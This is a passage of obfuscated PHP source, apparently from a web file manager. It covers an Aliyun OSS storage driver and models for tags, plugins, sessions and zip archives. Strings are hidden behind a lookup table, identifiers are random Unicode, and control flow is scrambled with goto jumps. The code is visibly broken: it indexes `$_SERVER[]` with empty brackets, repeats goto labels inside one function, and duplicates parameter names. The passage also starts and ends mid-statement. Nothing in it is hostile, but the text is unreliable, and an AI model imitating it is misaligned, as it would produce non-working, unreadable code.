$this->ext($c), $cߴջ[188] => !0, $cߴջ[189] => !0); if (empty($DĐαڣ)) { $Aё = $this->objectMeta($c); if (!$Aё) { return $aĎܽ; } $DĐαڣ = array($cߴջ[107] => strtotime($Aё[$cߴջ[1192]]), $cߴջ[77] => $Aё[$cߴջ[1193]] + 0); } goto D͎; eՙ: } private function folderInfo($fݕ, $e = array()) { $cʙ =& $_SERVER[]; $bըጛ = array($cʙ[28] => $this->pathThis($fݕ), $cʙ[75] => $this->getPathOuter($cʙ[8] . $fݕ), $cʙ[29] => $cʙ[76], $cʙ[187] => 0, $cʙ[107] => 0, $cʙ[188] => !0, $cʙ[189] => !0); if (empty($e)) { $fݕ = rtrim($fݕ, $cʙ[8]) . $cʙ[8]; $a̼ν = $this->objectMeta($fݕ); if (!$a̼ν) { return $bըጛ; } $e = array($cʙ[187] => $a̼ν[$cʙ[1194]][$cʙ[1195]], $cʙ[107] => strtotime($a̼ν[$cʙ[1192]])); } if (isset($e[$cʙ[107]])) { $bըጛ[$cʙ[107]] = $e[$cʙ[107]]; } if (isset($e[$cʙ[187]])) { $bըጛ[$cʙ[187]] = $e[$cʙ[187]]; } return $bըጛ; } public function listPath($A♮, $E邺 = false) { $C =& $_SERVER[]; $C߆Ɍ = $this->fileList($A♮, $C[8], !0); foreach ($C߆Ɍ[$C[74]] as $Aʶ => $Aٴ) { $C߆Ɍ[$C[74]][$Aʶ] = $this->folderInfo($Aٴ, $Aٴ); } foreach ($C߆Ɍ[$C[73]] as $Aʶ => $Aٴ) { $C߆Ɍ[$C[73]][$Aʶ] = $this->fileInfo($Aٴ[$C[28]], $Aٴ); } return $C߆Ɍ; } public function has($fˢ, $CĞМ = false, $E֦ = true) { goto BƘʭ; BƘʭ: $eȰͯ =& $_SERVER[]; $fˢ = trim($fˢ, $eȰͯ[8]); $Fđ = empty($fˢ) ? $eȰͯ[33] : $fˢ . $eȰͯ[8]; goto DÆ㽙; e: $A۾ = 0; while (!0) { $A = array($eȰͯ[1183] => $eȰͯ[8], $eȰͯ[186] => $Fđ, $eȰͯ[1184] => $aڔ߾, $eȰͯ[1185] => $d); try { $E̞ = $this->client->listObjects($this->bucket, $A); } catch (OSS\Core\OssException $Dš) { break; } $d = $E̞->getNextMarker(); $aџ = $E̞->getObjectList(); $Fƃ = $E̞->getPrefixList(); if ($CĞМ) { if (count($aџ) > 1 || count($aџ) == 1 && $aџ[0]->getKey() != $Fđ) { $eΣ += count($aџ) - 1; } if (!empty($Fƃ)) { $A۾ += count($Fƃ); } if ($d === $eȰͯ[33]) { break; } continue; } if ($E֦) { if (!empty($aџ)) { if (count($aџ) > 1 || $aџ[0]->getKey() != $Fđ) { return !0; } } } else { if (!empty($Fƃ)) { return !0; } } if ($d === $eȰͯ[33]) { break; } } if ($CĞМ) { return array($eȰͯ[191] => $eΣ, $eȰͯ[192] => $A۾); } goto f; DÆ㽙: $d = $eȰͯ[33]; $aڔ߾ = 500; $eΣ = 0; goto e; f: return !1; goto ḃ; ḃ: } public function listAll($E) { $b̲ =& $_SERVER[]; $Eۥ = $this->fileList($E, $b̲[33], !0); $D񇨤 = array(); foreach ($Eۥ[$b̲[73]] as $b) { $D񇨤[$b[$b̲[28]]] = $b[$b̲[77]]; } return $this->listAllFiles($E, array_keys($D񇨤), $D񇨤); } public function canRead($Eߛ) { $eՠ =& $_SERVER[]; $B̨ = $this->pathAcl($Eߛ); return $B̨ == $eՠ[1196] || $B̨ == $eՠ[493] ? !0 : !1; } public function canWrite($FΠ) { $BۜΪ = $this->pathAcl($FΠ); return $BۜΪ == $_SERVER[][493] ? !0 : !1; } public function pathAcl($A) { goto fóă; Eێޖ: $F㴎 = $F == $cԗׂ[34] ? $this->bucketAcl : $F; if ($F㴎 == $cԗׂ[1197]) { return $cԗׂ[1196]; } if ($F㴎 == $cԗׂ[1198]) { return $cԗׂ[493]; } goto bةҰ; fóă: $cԗׂ =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F = $this->client->getObjectAcl($this->bucket, $this->pathEncode($A)); } catch (OSS\Core\OssException $Fǆ) { return !1; } goto Eێޖ; bةҰ: return $F㴎; goto aѳ؟; aѳ؟: } private function chmodPath($C¤, $Bʞ = '') { $dƄ =& $_SERVER[]; $Eܣ = empty($Bʞ) ? $dƄ[1198] : $Bʞ; $A½ׯ = array($dƄ[34], $dƄ[185], $dƄ[1197], $dƄ[1198]); if (!in_array($Eܣ, $A½ׯ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($C¤), $Eܣ); } catch (OSS\Core\OssException $bߢ) { return !1; } return !0; } public function getContent($Dɹ) { return $this->fileSubstr($Dɹ, -1); } public function setContent($bο, $f = '') { $Dĳ =& $_SERVER[]; try { $DБ = $this->trafficLimit($Dĳ[1199]); $fЍ = $this->client->putObject($this->bucket, $this->pathEncode($bο), $f, $DБ); } catch (OSS\Core\OssException $aŒ) { return !1; } $Fǈ = array($Dĳ[1186] => trim($fЍ[$Dĳ[1200]], $Dĳ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bο))); $this->updateObjMeta($bο, $Fǈ); return isset($fЍ[$Dĳ[1201]][$Dĳ[1148]]) ? (int) $fЍ[$Dĳ[1201]][$Dĳ[1148]] : strlen($fЍ); } private function updateObjMeta($FԦ, $Fϻ) { $FԦ = $this->pathEncode($FԦ); try { $a = array(OSS\OssClient::OSS_HEADERS => $Fϻ); $this->client->copyObject($this->bucket, $FԦ, $this->bucket, $FԦ, $a); } catch (OSS\Core\OssException $eᵈ) { return !1; } return !0; } public function upload($a׏簎, $d, $d = false, $aФ = REPEAT_REPLACE) { $C =& $_SERVER[]; $Cõ = trim($a׏簎, $C[8]); $f쬻 = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($C[1186] => @md5_file($d)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a׏簎))); $f쬻 = $this->trafficLimit($C[1199], $f쬻); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Cõ), $d, $f쬻); } catch (OSS\Core\OssException $Aᑋ) { return !1; } return $this->getPathOuter($a׏簎); } public function getHost() { $Bο􃡋 =& $_SERVER[]; $AΌ = explode($Bο􃡋[171], parent::getHost()); return $AΌ[0] . $Bο􃡋[171] . $this->bucket . $Bο􃡋[91] . $AΌ[1]; } public function uploadFormData($E, $bʆӭ = 3600) { goto D; Fӱ: return $b˫Ů; goto D㮣; D: $F׳ = date($bӐ[1202], time() + $Eڑٹ); $c񇒡 = new DateTime($F׳); $F = $c񇒡->format(DateTime::ISO8601); goto EΛ; cԧӖ: $eώ = base64_encode(hash_hmac($bӐ[218], $a, $this->secret, !0)); $b˫Ů = array($bӐ[1114] => $a, $bӐ[1205] => $this->accessKey, $bӐ[1110] => $bӐ[1102], $bӐ[1206] => $eώ, $bӐ[169] => $dʧ걇); $b˫Ů = $this->trafficLimit($bӐ[1199], $b˫Ů); goto Fӱ; D: $bӐ =& $_SERVER[]; if (!($dʧ걇 = $this->getHost())) { return !1; } $Eڑٹ = $bʆӭ; goto D; fܯ沄: $B = $this->pathFather($E); $d΅ = array($bӐ[1104] => $F, $bӐ[1105] => array(array($bӐ[1204], 0, $aҮ), array($bӐ[1108], $bӐ[1109], $B))); $a = base64_encode(json_encode($d΅)); goto cԧӖ; EΛ: $D׷ = strpos($F, $bӐ[284]); $F = substr($F, 0, $D׷) . $bӐ[1203]; $aҮ = 1048576000 * 5; goto fܯ沄; D㮣: } public function multiUploadFormData($E, $Bܟ = 3600) { $dϣ =& $_SERVER[]; if (!($a΂ = $this->getHost())) { return !1; } $BՂ = $this->trafficLimit($dϣ[1199]); $F︌ܰ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E), $BՂ); return array($dϣ[209] => $F︌ܰ, $dϣ[169] => $a΂ . $dϣ[8] . $this->pathEncode($E), $dϣ[210] => gmdate($dϣ[1207]), $dϣ[89] => $E); } public function multiUploadAuthData($d, $Eå = array()) { goto f͎⍤; d: $Cټ = $B㑪ν[1210] . $this->accessKey . $B㑪ν[4] . $eƞ; if (strpos($bڊ, $B㑪ν[213]) === 0) { $Cټ = array($B㑪ν[220] => $Cټ, $B㑪ν[210] => $a৺); if ($a͚豭) { $Cټ = array_merge($Cټ, $a͚豭); } } return $Cټ; goto d; bؑ: $cܸ = $d; if (isset($Eå[$B㑪ν[89]])) { $cܸ = $Eå[$B㑪ν[89]]; unset($Eå[$B㑪ν[89]]); } if (isset($Eå[$B㑪ν[211]])) { $Eå[$B㑪ν[210]] = $a৺; return $this->listUploadParts($cܸ, $Eå); } goto C쏶; fÆ: if (!empty($Eå[$B㑪ν[1209]])) { $aю = array_merge(array($d㐚[4]), $Eå[$B㑪ν[1209]]); sort($aю); $d㐚[4] = implode($B㑪ν[217], $aю); } $Fأ = implode($B㑪ν[217], $d㐚); $eƞ = base64_encode(hash_hmac($B㑪ν[218], $Fأ, $this->secret, !0)); goto d; f͎⍤: $B㑪ν =& $_SERVER[]; $a৺ = isset($Eå[$B㑪ν[210]]) ? $Eå[$B㑪ν[210]] : gmdate($B㑪ν[1207]); $bڊ = isset($Eå[$B㑪ν[160]]) ? $Eå[$B㑪ν[160]] : $B㑪ν[33]; goto bؑ; C쏶: $d㐚 = array($B㑪ν[212], $B㑪ν[33], $B㑪ν[116], $a৺, "\x78\55\x6f\163\163\x2d\x64\141\x74\x65\x3a{$a৺}", $B㑪ν[8] . $this->bucket . $B㑪ν[8] . $cܸ . $bڊ); if (strpos($bڊ, $B㑪ν[213]) === 0) { $d㐚[0] = $B㑪ν[214]; if ($a͚豭 = $this->trafficLimit($B㑪ν[1199])) { $cܸ = $B㑪ν[1208]; array_splice($d㐚, 5, 0, $cܸ . $B㑪ν[4] . $a͚豭[$cܸ]); } } if (isset($Eå[$B㑪ν[215]]) && $Eå[$B㑪ν[215]] == $B㑪ν[216]) { $d㐚[0] = $B㑪ν[216]; } goto fÆ; d: } public function listUploadParts($Fʃ, $FӍ) { goto dǾ; Eȉ: return array($CՊ[220] => $d, $CՊ[210] => $FӍ[$CՊ[210]], $CՊ[222] => $dƱ); goto B۰ˑ; dǾ: $CՊ =& $_SERVER[]; $cƶ = parse_url_query($FӍ[$CՊ[160]]); $B͙ = $this->client->listParts($this->bucket, $this->pathEncode($Fʃ), $cƶ[$CՊ[209]]); goto cͅð; BСҶ: unset($FӍ[$CՊ[211]], $FӍ[$CՊ[215]]); $d = $this->multiUploadAuthData($Fʃ, $FӍ); if (empty($d)) { return !1; } goto Eȉ; cͅð: $d = $B͙->getListPart(); $dƱ = array(); foreach ($d as $a͘) { $dƱ[] = array($CՊ[1190] => $a͘->getPartNumber(), $CՊ[1191] => trim($a͘->getETag(), $CՊ[113])); } goto BСҶ; B۰ˑ: } public function download($Aք, $eŧᨄ) { if ($this->isFolder($Aք)) { return !1; } try { $e㸠ӌ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $eŧᨄ); $e㸠ӌ = $this->trafficLimit($_SERVER[][105], $e㸠ӌ); $this->client->getObject($this->bucket, $this->pathEncode($Aք), $e㸠ӌ); } catch (OSS\Core\OssException $d) { return !1; } return $eŧᨄ; } public function fileSubstr($aǚ, $b񛅵 = 0, $D = false) { if ($b񛅵 === -1) { $EԒ = array(); } else { if ($D === !1) { $BɆ = $this->size($aǚ); } else { $BɆ = $b񛅵 + $D - 1; } $EԒ = array(OSS\OssClient::OSS_RANGE => "{$b񛅵}\x2d{$BɆ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($aǚ), $EԒ); } catch (OSS\Core\OssException $Bݦ) { think_exception($Bݦ->getMessage()); return !1; } } private function trafficLimit($E, $EՊă = array()) { goto Aڂ; A㛉У: return $EՊă; goto F۲; Aڂ: $eΨÒ =& $_SERVER[]; if ($E == $eΨÒ[1199] && $this->isUploadServer() || $E == $eΨÒ[105] && $this->isFileOutServer()) { return $EՊă; } $A = floatval($GLOBALS[$eΨÒ[6]][$eΨÒ[84]][$eΨÒ[103]][$E]) * 1024 * 1024 * 8; goto D; D: if (!$A) { return $EՊă; } $A = $A < 819200 ? 819200 : ($A > 838860800 ? 838860800 : $A); $EՊă[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A); goto A㛉У; F۲: } public function link($b׳, $d = array()) { $e =& $_SERVER[]; if (!$this->exist($b׳) || $this->isFolder($b׳)) { return !1; } try { $d = $this->trafficLimit($e[105], $d); $DЎ = $this->client->signUrl($this->bucket, $this->pathEncode($b׳), 3600 * 12, $e[216], $d); return $this->getCdnLink($DЎ); } catch (OSS\Core\OssException $A׻䩩) { return !1; } } public function fileOut($d̾, $D = false, $a§Ɠ = false, $D = '') { goto eȱķ; eȱķ: $aĂ =& $_SERVER[]; if (!$a§Ɠ) { $a§Ɠ = $this->pathThis($d̾); } $a§Ɠ = rawurlencode($a§Ɠ); goto bԖ; fȅ: $Dקē = array(OSS\OssClient::OSS_SUB_RESOURCE => $aĂ[1211] . rawurlencode("{$D}\73\146\x69\x6c\x65\156\141\155\x65\75{$a§Ɠ}")); $Dקē[OSS\OssClient::OSS_SUB_RESOURCE] .= $aĂ[1212] . rawurlencode($E); $B = $this->link($d̾, $Dקē); goto f; bԖ: $E = get_file_mime(get_path_ext($a§Ɠ)); if ($E == $aĂ[201]) { return parent::fileOut($d̾, $D, $a§Ɠ, $D); } $D = $D ? $aĂ[202] : $aĂ[203]; goto fȅ; f: $this->fileOutLink($B); goto aը옫; aը옫: } public function fileOutServer($E, $c = false, $d = false, $E = '') { parent::fileOut($E, $c, $d, $E); } public function fileOutImage($Dʵ, $c½ٱ = 250) { $cو = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1213] . $c½ٱ); $f = $this->link($Dʵ, $cو); $this->fileOutLink($f); } public function fileOutImageServer($e؛ڃ, $d = 250) { parent::fileOutImage($e؛ڃ, $d); } public function fileOutLink($Dք) { $B =& $_SERVER[]; if (!$this->isCdnHost() && substr($Dք, 0, 7) == $B[1117]) { $Dք = $B[1118] . substr($Dք, 7); } header($B[156] . $Dք); die; } public function hashMd5($e󆔑, $B = '') { $Eǯ =& $_SERVER[]; $b뜕 = $this->objectMeta($e󆔑); if (!$b뜕) { return $Eǯ[33]; } if (!isset($b뜕[$Eǯ[1186]]) && !empty($B)) { $Cҍ = $this->updateObjMeta($e󆔑, array($Eǯ[1186] => $B)); $b뜕[$Eǯ[1186]] = $Cҍ ? $B : $Eǯ[33]; } return isset($b뜕[$Eǯ[1186]]) ? strtolower($b뜕[$Eǯ[1186]]) : $Eǯ[33]; } public function size($A) { $Fӆ = $this->objectMeta($A); return $Fӆ ? $Fӆ[$_SERVER[][77]] : 0; } public function info($a) { if ($this->isFolder($a)) { return $this->folderInfo($a); } else { if ($this->isFile($a)) { return $this->fileInfo($a); } } return !1; } public function exist($Eς) { return $this->isFile($Eς) || $this->isFolder($Eς); } public function isFile($E辡) { return !$this->isFolder($E辡) && $this->objectMeta($E辡); } public function isFolder($cޘ) { return $this->cacheMethod($_SERVER[][223], $cޘ); } protected function objectMeta($F͇) { return $this->cacheMethod($_SERVER[][224], $F͇); } protected function _objectMeta($Eˋ) { $a =& $_SERVER[]; try { $aػ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Eˋ)); } catch (OSS\Core\OssException $B) { $aػ = !1; } if ($aػ) { $aػ[$a[77]] = intval($aػ[$a[1193]]); } return $aػ; } protected function _isFolder($c˔) { $eƩư =& $_SERVER[]; if ($c˔ == $eƩư[33] || $c˔ == $eƩư[8]) { return !0; } $b = array($eƩư[1183] => $eƩư[8], $eƩư[186] => rtrim($c˔, $eƩư[8]) . $eƩư[8], $eƩư[1184] => 1, $eƩư[1185] => $eƩư[33]); $Dڧų = $this->client->listObjects($this->bucket, $b); if ($Dڧų->getObjectList() || $Dڧų->getPrefixList()) { return !0; } return !1; } } goto fַ; a: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\166"; protected function cacheFunctionAlias($e) { $D =& $_SERVER[]; return array($D[2202] => array($e[0], $D[2203]), $D[2204] => array($e[0], $D[2205])); } protected function get($F) { $Aċă =& $_SERVER[]; $A = Model($Aċă[460])->metaGet($F, $Aċă[2206]); $c = json_decode($A, !0); return $c ? $c : array($Aċă[2207] => $Aċă[83], $Aċă[354] => array()); } protected function set($B, $eض) { $E߂ү =& $_SERVER[]; $eض = $eض ? $eض : array($E߂ү[2207] => $E߂ү[83], $E߂ү[354] => array()); Model($E߂ү[460])->metaSet($B, $E߂ү[2206], json_encode($eض)); return Model($E߂ү[460])->metaSet($B, $E߂ү[2206], json_encode($eض)); } protected function getByTagID($F󫸟, $bÔ) { goto C; c穐: return is_array($EȠ) ? $EȠ : !1; goto Dς; dǿ: $f = $this->get($F󫸟); if (!$f || !isset($f[$c[354]])) { return !1; } $EȠ = array_find_by_field($f[$c[354]], $c[367], $bÔ); goto c穐; C: $c =& $_SERVER[]; if (!$F󫸟 || !$bÔ) { return !1; } if (!Model($c[460])->getInfoSimple($F󫸟)) { return !1; } goto dǿ; Dς: } public function listSource($eՎ, $c) { goto fܓ; aѕ: if ($C) { $this->removeBySource($eՎ, $C); } return $B۞׆; goto e帄; Fګ: $bռ = array_to_keyvalue($B۞׆[$E[73]], $E[33], $E[369]); $f، = array_merge($bռ, $e򋧻ߡ); foreach ($c䩅σ as $Eɔȃ) { if (!in_array($Eɔȃ, $f،)) { $C[] = $Eɔȃ; } } goto aѕ; e: $e؊ = array(); foreach ($eȄ as $d) { $Eɔȃ = $d[$E[75]]; if (!$Eɔȃ) { continue; } if (!isset($e؊[$Eɔȃ])) { $e؊[$Eɔȃ] = array(); } $e؊[$Eɔȃ][] = $d[$E[393]]; } $c䩅σ = array(); goto e; fޛ: if (!$B۞׆ || count($c䩅σ) == $B۞׆[$E[351]][$E[352]]) { return $B۞׆; } $C = array(); $e򋧻ߡ = array_to_keyvalue($B۞׆[$E[74]], $E[33], $E[369]); goto Fګ; fܓ: $E =& $_SERVER[]; if ($c && !is_array($c)) { $c = array($c); } $eȄ = $this->listData($eՎ); goto e; e: foreach ($e؊ as $cݍ => $d̺) { $B = !0; if (!$c) { $c䩅σ[] = $cݍ; continue; } foreach ($c as $bƂ) { if (!in_array($bƂ, $d̺)) { $B = !1; break; } } if ($B) { $c䩅σ[] = $cݍ; } } if (!$c䩅σ) { return array(); } $B۞׆ = Model($E[1119])->listSource(array($E[383] => array($E[384], $c䩅σ))); goto fޛ; e帄: } protected function listData($cֳ) { $f =& $_SERVER[]; $Bרʡ = array($f[1428] => 0, $f[436] => array($f[2208], 0), $f[388] => $f[2209] . $cֳ); $B = $f[2210]; $cʃ = $this->field($B)->where($Bרʡ)->order($f[2211])->select(); return $cʃ ? $cʃ : array(); } protected function addToTag($cÛ, $BҜĎ, $c̨) { $D =& $_SERVER[]; if (!$this->getByTagID($cÛ, $c̨) || !$BҜĎ) { return !1; } if (!Model($D[751])->pathInfo($BҜĎ)) { return !1; } $F˻ؽ = array($D[1428] => 0, $D[436] => $c̨, $D[387] => $BҜĎ, $D[388] => $D[2212] . $cÛ, $D[386] => $D[33], $D[2112] => 0); if ($this->where($F˻ؽ)->find()) { return !1; } return $this->add($F˻ؽ); } protected function removeFromTag($d, $E, $Fߧ샢) { $C =& $_SERVER[]; if (!$this->getByTagID($d, $Fߧ샢) || !$E) { return !1; } if (is_array($E)) { $E = array($C[7], $E); } $aȠك = array($C[1428] => 0, $C[436] => $Fߧ샢, $C[388] => $C[2212] . $d, $C[387] => $E); return $this->where($aȠك)->delete(); } protected function removeByTag($Fޅ, $cΡ) { $e碍 =& $_SERVER[]; if (!$this->getByTagID($Fޅ, $cΡ)) { return !1; } $b = array($e碍[1428] => 0, $e碍[436] => $cΡ, $e碍[388] => $e碍[2212] . $Fޅ); return $this->where($b)->delete(); } protected function removeBySource($Eܝ, $c) { $F =& $_SERVER[]; if (!$Eܝ || !$c) { return !1; } if (is_array($c)) { $c = array($F[7], $c); } $C྄ = array($F[1428] => 0, $F[387] => $c, $F[436] => array($F[929], 0), $F[388] => $F[2212] . $Eܝ); return $this->where($C྄)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\160\x6c\x75\147\x69\156\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\163\x74\x61\164\x75\163", "\162\145\x67\x69\x65\x73\164", "\x63\x6f\x6e\146\151\147"); public function loadList($B܎ = false) { $eŴ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($B܎) { return $eŴ[$B܎]; } return $eŴ; } public function init() { $f =& $_SERVER[]; Hook::trigger($f[2213]); $f͆ = $this->loadPluginList(); foreach ($f͆ as $A => $c٢) { $eƕ = $this->appAllow($A, $c٢); if (!$eƕ) { continue; } foreach ($c٢[$f[2214]] as $Bқ˽ => $c) { Hook::bind($Bқ˽, $c); } } Hook::trigger($f[2215]); Hook::trigger(ACTION); } public function appAllow($Bڮ, $fٵ, $C̽ = true) { $E =& $_SERVER[]; $bƎ = PLUGIN_DIR . $Bڮ . $E[2216]; if (!is_array($fٵ) || !is_array($fٵ[$E[2214]]) || !is_file($bƎ) || $fٵ[$E[688]] != 1) { return !1; } if ($C̽ && !Action($E[2217])->checkAuth($Bڮ)) { return !1; } return !0; } public function unInstall($C⏗) { $c =& $_SERVER[]; $e˘ܿ = $this->loadList($C⏗); if (file_exists(PLUGIN_DIR . $C⏗)) { Hook::apply($C⏗ . $c[2218]); } $this->remove($e˘ܿ[$c[367]]); } public function changeStatus($AЈ, $Cώ) { $Eˑ =& $_SERVER[]; $Eψ = $this->loadList($AЈ); if ($Cώ) { Hook::apply($AЈ . $Eˑ[2219]); } $this->update($Eψ[$Eˑ[367]], array($Eˑ[2220] => $Cώ)); } public function appRegist($cֺ, $e) { $B =& $_SERVER[]; $A﹅팗 = $this->loadList($cֺ); if ($A﹅팗) { $this->update($A﹅팗[$B[367]], array($B[2214] => $e)); } else { $bΎ = array($B[28] => $cֺ, $B[2214] => $e, $B[688] => 0, $B[6] => $this->getConfigDefault($cֺ)); $this->insert($bΎ); } } public function getConfigDefault($B) { $D =& $_SERVER[]; $fȢڜ = array(); $f = $this->getPackageJson($B); if (!$f && is_array($f[$D[2221]])) { return $fȢڜ; } foreach ($f[$D[2221]] as $E񇍓 => $F٢皼) { if (!isset($F٢皼[$D[359]]) || isset($fȢڜ[$E񇍓])) { continue; } $fȢڜ[$E񇍓] = $F٢皼[$D[359]]; } return $fȢڜ; } public function getPackageJson($Eтӟ) { return Hook::apply($Eтӟ . $_SERVER[][2222]); } public function getConfig($D˞, $Aνٔ = false) { $aΠվ =& $_SERVER[]; $b = array(); $Fԡ = $this->loadList($D˞); if ($Fԡ && is_array($Fԡ[$aΠվ[6]])) { $b = $Fԡ[$aΠվ[6]]; } if (!$b || $Aνٔ) { $b = $this->getConfigDefault($D˞); } return $b; } public function setConfig($F쮌, $Aۗ媒 = false) { goto D峿; dՃ׻ُ: $this->update($cщ[$f[367]], array($f[6] => $Aǣ)); goto Dیׄ벲; BƔ: $Aǣ = $cщ[$f[6]]; if ($Aۗ媒 == !1) { $Aǣ = array(); $Aۗ媒 = $this->getConfigDefault($F쮌); } foreach ($Aۗ媒 as $Bү => $cﭷϖ) { $Aǣ[$Bү] = is_string($cﭷϖ) ? trim($cﭷϖ) : $cﭷϖ; } goto dՃ׻ُ; D峿: $f =& $_SERVER[]; $cщ = $this->loadList($F쮌); if (!$cщ) { return !1; } goto BƔ; Dیׄ벲: } public function viewList() { goto AϬ; AϬ: $dԓᢱ =& $_SERVER[]; $a㿗 = $this->loadList(); $this->pluginScan($a㿗); goto AС; AС: $a㿗 = $this->loadPluginList(); $Dڳ = array(); foreach ($a㿗 as $Cݺ => $f) { unset($f[$dԓᢱ[2214]], $f[$dԓᢱ[6]]); $F䱬 = PLUGIN_DIR . $f[$dԓᢱ[28]] . $dԓᢱ[2216]; if (!is_file($F䱬)) { continue; } $e = Hook::apply($f[$dԓᢱ[28]] . $dԓᢱ[2222]); if (is_array($e)) { $Dڳ[$Cݺ] = array_merge($f, $e); } } goto e呸; e呸: return $Dڳ; goto e; e: } private function loadPluginList() { $b =& $_SERVER[]; $aΖ = $this->loadList(); if (strtolower(MOD) == $b[2223]) { return $aΖ; } $A٤ = Hook::trigger($b[2224], $aΖ); if ($aΖ && !$A٤) { die; } return $A٤ ? $A٤ : $aΖ; } private function pluginScan($E) { $bȠ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $dͱ, $E͆, 0); foreach ($dͱ as $dժ¬) { $Dʛ = get_path_this($dժ¬); if (isset($E[$Dʛ]) || !file_exists($dժ¬ . $bȠ[2225]) || !file_exists($dժ¬ . $bȠ[2216])) { continue; } Hook::apply($Dʛ . $bȠ[2219]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\163\x65\163\163\151\x6f\x6e"; public function get($dο) { $aŢ =& $_SERVER[]; $c擂ǆ = $this->where(array($aŢ[2226] => $dο))->find(); if (!is_array($c擂ǆ)) { return !1; } return $c擂ǆ[$aŢ[691]]; } public function set($Fӿˋ, $C֝, $e = 3600) { $Dǽ =& $_SERVER[]; $e؆Ӓ = array($Dǽ[2226] => $Fӿˋ, $Dǽ[2138] => $C֝, $Dǽ[2227] => $e + time()); if (Session::get($Dǽ[2228])) { $e؆Ӓ[$Dǽ[1437]] = Session::get($Dǽ[2228]); } else { $e؆Ӓ[$Dǽ[1437]] = 0; } if ($this->get($Fӿˋ)) { return $this->where(array($Dǽ[2226] => $Fӿˋ))->save($e؆Ӓ); } else { return $this->add($e؆Ӓ, array(), !0); } } public function remove($D뾵) { return $this->where(array($_SERVER[][2226] => $D뾵))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][2229] . time())->delete(); } } goto a; eܛ: define($_SERVER[][227], 2); define($_SERVER[][228], 3); define($_SERVER[][229], 1); goto Aʍ; Eჴ䄰: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $f; if (!$f) { $cС = IO::init($_SERVER[][8]); } return $cС; } private static function iconvSystem($D) { return self::local()->iconvSystem($D); } private static function iconvApp($cЮ) { return self::local()->iconvApp($cЮ); } public static function zip($cఅ, $c = "\x7a\151\x70", $C̑ғ = '', $DՈ = REPEAT_RENAME) { goto E; aՋӝ: if (!$B욅) { del_dir($f); show_json(LNG($aӌՃ[1029]), !1); } del_dir($f); return $B욅; goto c; dֽդ: foreach ($Aʌ as $f֌ => $C) { $Aʌ[$f֌] = self::iconvSystem($C); } KodArchive::create($D飱, $Aʌ); if (!IO::exist($E۵)) { if ($f) { del_dir($f); } show_json(LNG($aӌՃ[1029]), !1); } goto dт; BƦΰ: if (count($Aʌ) > 1) { $Eӷڵ = IO::info(IO::pathFather($b働[$aӌՃ[75]])); $B܃ = $Eӷڵ[$aӌՃ[28]]; } $fÚӵ = $f; if (!$fÚӵ) { $fÚӵ = get_path_father($b働[$aӌՃ[75]]); $fիƉ̣ = IO::info($fÚӵ); if (!$fիƉ̣[$aӌՃ[189]]) { show_json(LNG($aӌՃ[1028]), !1); } } goto E; dт: if ($C̑ғ || !$f) { if ($f && strstr($f, TEMP_FILES)) { $dϪ = $Aʌ = array(); recursion_dir($fÚӵ, $dϪ, $Aʌ, 0); foreach ($dϪ as $E) { del_dir($E); } foreach ($Aʌ as $E) { if ($E == $D飱) { continue; } del_file($E); } } return $E۵; } $A = self::pathFather($b働[$aӌՃ[75]]); $B욅 = self::move($E۵, $A, $DՈ); goto aՋӝ; E: $aӌՃ =& $_SERVER[]; $F = self::init($cఅ[0][$aӌՃ[75]]); $b働 = self::info($cఅ[0][$aӌՃ[75]]); goto Dф; E: $E۵ = $fÚӵ . $B܃ . $aӌՃ[91] . $c; $E۵ = get_filename_auto($E۵, $aӌՃ[33], $DՈ); $D飱 = self::iconvSystem($E۵); goto dֽդ; Dф: $f = !1; if (!$C̑ғ && $F->getType() == $aӌՃ[102]) { $Aʌ = self::zipFileList($cఅ); } else { $f = $C̑ғ ? $C̑ғ : TEMP_FILES . $aӌՃ[1027] . time() . rand_string(8) . $aӌՃ[8]; mk_dir($f); $Aʌ = self::zipFileList($cఅ, $f); } $B܃ = $b働[$aӌՃ[28]]; goto BƦΰ; c: } public static function unzip($c惪, $D = "\162\145\160\154\x61\143\145") { goto d嫑; aЉܸ: mk_dir($BӉ); $b͆ɼ = self::fileExt($c); $fʼ軶 = $BӉ . $B럂[91] . $b͆ɼ; goto D둠; Dñα: Hook::trigger($B럂[1037], $BӉ); recursion_dir($BӉ, $f, $AĒ, 0); $AƪԹ = array_merge($f, $AĒ); goto e䨝; f: $Cõ = KodArchive::extract($fʼ軶, $BӉ . $B럂[8], $dԹӍ); self::archiveExt(); if (!$Cõ[$B럂[1034]]) { show_json($B럂[1035] . $Cõ[$B럂[1036]], !1); } goto Dñα; e䨝: foreach ($AƪԹ as $f燶) { $f燶 = self::iconvApp($f燶); self::move($f燶, $eė, $D); } del_dir($BӉ); if (!$Aީ) { del_file($fʼ軶); } goto a珻; D둠: if (!@file_exists(self::iconvSystem($fʼ軶))) { $Aީ = self::localFilePath($Bŗ, $b͆ɼ); $fʼ軶 = $Aީ ? $Aީ : parent::download($Bŗ, $fʼ軶); } $fʼ軶 = self::iconvSystem($fʼ軶); $dԹӍ = isset($c惪[$B럂[1032]]) ? $c惪[$B럂[1032]] : $B럂[1033]; goto f; a珻: return !0; goto C樇; AՂ: $e = self::tmpFileName($c); $BӉ = TEMP_FILES . $e; del_dir($BӉ); goto aЉܸ; d嫑: $B럂 =& 